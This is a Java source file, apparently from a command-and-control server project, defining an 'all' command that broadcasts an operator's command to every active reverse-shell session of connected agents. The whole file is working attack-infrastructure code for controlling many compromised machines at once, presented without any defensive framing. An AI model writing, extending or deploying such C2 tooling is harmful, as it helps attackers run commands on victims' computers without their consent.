package com.mtattab.c2cServer.service.commands.manager;

import com.mtattab.c2cServer.model.json.ManagerCommunicationModel;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.service.commands.connected.DefualtConnectedCommand;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.ArrayList;
import java.util.List;

public class AllSendCommand implements Command {
    @Override
    public void execute(List<String> args, WebSocketSession currentSocket) {
        args = new ArrayList<>(args);

        args .remove(0);

        if (args.isEmpty()){
            SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg("commands argument not found. Example Command: all /exit")
                    .success(false)
                    .build()
            )));

            return;
        }

        sendMessageToALlAgents(args,currentSocket);


    }


    private void sendMessageToALlAgents(List<String> args,  WebSocketSession currentSocket ){
        String mangerMessage = DataManipulationUtil.joinListWithDelimiter(args," ");
        DefualtConnectedCommand defualtConnectedCommand = new DefualtConnectedCommand();

        for (WebSocketSession activeReverseShellSession : ConnectionManager.activeReverseShellSessions) {
            defualtConnectedCommand.sendCommandToShell( mangerMessage , activeReverseShellSession, currentSocket);
        }

        SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                .msg("Sent Message to all agents")
                .success(true)
                .build()
        )));


    }
}
